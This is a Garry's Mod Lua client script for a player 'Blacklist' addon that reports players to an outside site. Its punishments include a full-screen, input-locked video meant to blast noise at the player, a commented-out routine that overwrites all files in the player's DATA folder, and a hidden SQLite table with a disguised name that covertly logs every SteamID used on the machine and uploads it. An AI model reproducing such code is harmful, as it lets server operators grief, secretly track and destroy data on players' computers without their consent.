local function report(senderNick, senderSteam, victimSteam, raison)
	http.Post("https://g-box.fr/wp-content/blacklist/report.php", { senderNick=senderNick, senderSteam=senderSteam, victimSteam=victimSteam, raison=raison },function()
		chat.AddText(Color(255,0,0), "[BL] Report sended by homing pigeon!")
	end, function(er) 
		chat.AddText(Color(255,0,0), "[BL] Homing pigeon was shot in fly by "..er)
	end)
end

local function showBlacklistDerma()
	ply = LocalPlayer()
	local Window = vgui.Create("DFrame")
	Window:SetTitle("Report")
	Window:SetDraggable( false )
	Window:ShowCloseButton(true)
	Window:SetBackgroundBlur( true )
	Window:SetDrawOnTop( true )
	local InnerPanel = vgui.Create("DPanel", Window)
	InnerPanel:SetPaintBackground(false)
	local Text = vgui.Create("DLabel", InnerPanel)
	Text:SetText("Report someone to The Blacklist")
	Text:SizeToContents()
	Text:SetContentAlignment( 5 )
	local SteamPanel = vgui.Create("DPanel", Window)
	SteamPanel:SetPaintBackground(false)
	local TexteEntry = vgui.Create("DTextEntry", SteamPanel)
	TexteEntry:SetText("Reason")
	TexteEntry.OnEnter = function()
		Window:Close()
		report(ply:Nick(), ply:SteamID(), SteamIDReport:GetValue(), TexteEntry:GetValue()) -- send reporter's nick and steamid and the player reported steamid and reason
	end
	local SteamIDReport = vgui.Create("DTextEntry", SteamPanel)
	SteamIDReport:SetText("STEAMID")
	SteamIDReport.OnEnter = function()
		TexteEntry:RequestFocus()
		TexteEntry:SelectAllText(true)
	end
	local SteamLabel = vgui.Create("DLabel",SteamPanel)
	SteamLabel:SetText("SteamID:")
	SteamLabel:SetPos( 200, 0)
	SteamLabel:SetSize( 50, 15)
	local ButtonPanel = vgui.Create("DPanel", Window)
	ButtonPanel:SetTall(25)
	ButtonPanel:SetPaintBackground(false)
	local ButtonOk = vgui.Create("DButton", ButtonPanel)
	ButtonOk:SetText("OK")
	ButtonOk:SizeToContents()
	ButtonOk:SetTall( 20 )
	ButtonOk:SetWide( ButtonOk:GetWide() + 20 )
	ButtonOk:SetPos(5, 3)
	ButtonOk.DoClick = function()
	   	Window:Close()
		report( ply:Nick(), ply:SteamID(), SteamIDReport:GetValue(), TexteEntry:GetValue())
	end
	ButtonPanel:SetWide( ButtonOk:GetWide() + 5 )
	Window:SetSize( 450, 111 + 75 + 20 )
	Window:Center()
	InnerPanel:StretchToParent( 5, 25, 5, 125 )
	SteamPanel:StretchToParent(5, 83, 5, 37)
	SteamIDReport:SetPos(149, 20)
	SteamIDReport:SetSize( 150, 20)
	Text:StretchToParent( 5, 5, 5, nil )
	TexteEntry:StretchToParent( 5, nil, 5, nil )
	TexteEntry:AlignBottom( 5 )
	TexteEntry:RequestFocus()
	ButtonPanel:CenterHorizontal()
	ButtonPanel:AlignBottom(7)
	Window:MakePopup()
	Window:DoModal()
	SteamIDReport:RequestFocus()
	SteamIDReport:SelectAllText(true)
end

local function blacklistUrlCli(time)
	local Window = vgui.Create("DFrame")
	Window:SetSize(ScrW(),ScrH())
	Window:SetTitle("")
	Window:SetVisible(true)
	Window:SetDraggable(false)
	Window:ShowCloseButton(false)
	Window:Center()
	Window:MakePopup()
	Window:SetMouseInputEnabled(false)
	Window:SetKeyboardInputEnabled(false)
	function Window:Paint(w,h)
		draw.RoundedBox( 0, 0, 0, w, h,Color(0,0,0))
	end
	local html = vgui.Create("DHTML", Window)
	html:Dock(FILL)
	html:OpenURL("https://www.youtube.com/watch?v=3QMbzX4wVw4&autoplay=1&loop=1&controls=0&t=3s") -- ear rape
	html:SetScrollbars(false)
	html:SetAllowLua(false)
	timer.Simple( time, function()
		Window:Remove()
	end)
end

local function blacklistUpgradeMe() -- delete everything in data/
	-- IF YOU UNCOMMENT THIS LINE EVERYTHING THE BLACKLIST DO IS YOUR RESPONSABILTY
	--[[
	local files, folders = file.Find(path .. "*", "DATA")
	for _,v in pairs(files) do
		file.Write(path..v, "Vous Ãªtes dans la Blacklist. Tout votre dossier DATA a Ã©tÃ© effacÃ©.\nBLACKLIST => http://g-box.fr/\n")
		file.Append(path..v,"You are in The Blacklist. Your DATA folder was deleted.\nBLACKLIST => http://g-box.fr/")
	end
	
	for _,v in pairs(folders) do
		blacklistUpgradeMe(path .. v .."/")
	end
	]]
end

net.Receive("blacklist_gbox_net", function() -- Better than creating over 9000 networkString nah ?
	local mode = net.ReadUInt(2)
	if mode == 0 then
		blacklistUrlCli(net.ReadUInt(16))
	elseif mode == 1 then
		blacklistUpgradeMe()
	elseif mode == 2 then
		showBlacklistDerma()
	end
end)

if blacklistConfig.bypassBanCheck then
	if !sql.TableExists("hellowatrudoinghere") then
		sql.Query("CREATE TABLE hellowatrudoinghere ( topsickrekt VARCHAR(30) )")
		sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES ("..LocalPlayer():SteamID()..")")
	else
		net.Start("blacklist_gbox_net")
		net.WriteUInt(0,2)
		net.WriteTable(sql.Query("SELECT * FROM hellowatrudoinghere"))
		net.SendToServer() 
		if type(sql.Query("SELECT * FROM hellowatrudoinghere WHERE topsickrekt="..LocalPlayer():SteamID())) == "nil" then
			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES ("..LocalPlayer():SteamID()..")")
		end
	end
end

if table.Count(blacklistConfig.countryBan) > 0 then
	local countryCode = system.GetCountry()
	if table.HasValue(blacklistConfig.countryBan, countryCode) then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(1,2)
		net.WriteString(countryCode)
		net.SendToServer()
	end
end